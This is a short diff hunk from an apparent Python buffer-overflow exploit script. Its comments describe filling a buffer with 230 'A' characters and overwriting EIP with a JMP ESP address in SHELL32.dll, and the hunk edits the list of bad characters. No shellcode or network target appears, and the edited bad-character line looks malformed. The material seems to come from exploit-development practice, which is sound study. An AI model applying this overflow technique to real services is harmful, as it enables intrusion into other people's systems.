@@ -5,7 +5,7 @@ import socket
 # This script is intended full the buffer, modify EIP value with our JMP ESP value 7CB32F34, which refers to SHELL32.dll
 # execute it, and then fill with Cs
 
-# badchars \x0a\x0d\xc0
+# badchars \00\x0a\x0d
 # JMP ESP 0x7CB32F34, as this is intel processor this is read as little endian, see EIP variable
 FUZZ = "A" * 230
 EIP = b"\x34\x2F\xB3\x7C"
